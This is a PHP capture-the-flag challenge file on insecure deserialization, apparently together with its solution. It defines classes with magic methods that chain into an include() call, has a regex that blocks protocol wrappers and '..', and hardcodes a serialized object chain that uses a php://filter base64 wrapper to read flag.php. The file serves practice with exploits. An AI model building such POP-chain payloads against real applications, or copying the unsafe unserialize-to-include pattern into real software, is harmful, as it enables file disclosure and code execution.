<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
//if(isset($_GET['pop'])){
//    @unserialize($_GET['pop']);
//}
//else{
//    $a=new Show;
//    highlight_file(__FILE__);
//}
unserialize('O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:58:"php://filter//read=convert.base64-encode/resource=flag.php";}}}s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:58:"php://filter//read=convert.base64-encode/resource=flag.php";}}}
');
